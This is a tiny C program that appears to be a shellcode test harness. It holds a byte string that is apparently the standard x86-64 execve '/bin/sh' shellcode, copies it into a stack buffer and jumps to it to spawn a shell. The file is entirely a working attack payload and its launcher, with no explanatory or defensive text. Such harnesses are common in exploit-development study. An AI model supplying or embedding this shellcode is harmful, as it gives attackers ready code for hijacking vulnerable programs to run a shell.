#include <stdio.h>
#include <stdlib.h>

const char shellcode[] = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";

int main (void)
{
  char buf[256];
  int len = sizeof(shellcode);
  for(int i=0; i<len; i++)
	 buf[i] = shellcode[i]; 
  ((void (*) (void)) buf) ();
}

